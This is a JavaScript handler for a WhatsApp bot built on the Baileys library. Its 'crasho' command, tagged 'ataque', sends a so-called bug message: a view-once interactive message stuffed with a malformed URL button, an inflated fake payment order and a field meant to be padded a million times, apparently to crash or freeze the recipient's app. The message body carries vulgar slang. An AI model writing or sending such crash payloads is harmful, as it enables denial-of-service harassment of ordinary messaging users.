const baileys = require('@whiskeysockets/baileys');
const generateWAMessageFromContent = baileys.generateWAMessageFromContent;
const proto = baileys.proto;

let handler = async (m, { conn }) => {
    async function ProtocolPayment(target, conn, quotedMsg) {
        const etc = generateWAMessageFromContent(target, proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    "interactiveMessage": {
                        "header": { "title": "", "subtitle": " " },
                        "body": { "text": "duar memek" },
                        "footer": { "text": "sponsor by: Akbar Diddy oli" },
                        "nativeFlowMessage": {
                            "buttons": [
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": "{ display_text : 'ZenBugWhatsApp', url : , merchant_url :  }"
                                },
                                {
                                    "name": "review_and_pay",
                                    "buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"REVIEW1\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"item1\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"item2\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"item3\",\"name\":\"Dimaz\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
                                }
                            ],
                            "messageParamsJson": "".repeat(1000000)
                        }
                    }
                }
            }
        }), { userJid: target, quoted: quotedMsg });

        await conn.relayMessage(target, etc.message, { messageId: etc.key.id });
    }

    await ProtocolPayment(m.chat, conn, m);
};

handler.command = ['crasho'];
handler.tags = ['fake', 'ataque'];
handler.help = ['crasho'];
module.exports = handler;